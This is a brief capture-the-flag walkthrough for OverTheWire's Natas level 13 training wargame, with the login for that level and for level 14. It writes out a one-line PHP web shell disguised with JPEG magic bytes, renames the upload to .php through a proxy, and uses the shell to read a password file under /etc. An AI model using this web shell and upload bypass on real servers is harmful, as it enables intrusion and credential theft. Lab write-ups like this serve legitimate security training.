### Natas Level 13

[natas13](http://natas13.natas.labs.overthewire.org)

**Username**: *natas13*

**Password**: *jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY*

### Solution

* Create a quick php shell (Level13-shell.php):

```bash
echo '\xFF\xD8\xFF\xE0<?php echo shell_exec($_GET[\'cmd\']);' > Level13-shell.php
```

* Intercept HTTP POST request(upload) using a proxy such as Burp.
* Change the filename to e.g. myshell.php
* Visit url http://natas13.natas.labs.overthewire.org/upload/<filename>.php?cmd=cat%20/etc/natas_webpass/natas14

#### Credentials for Level 14

**Username**: *natas14*

**Password**: *Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1*
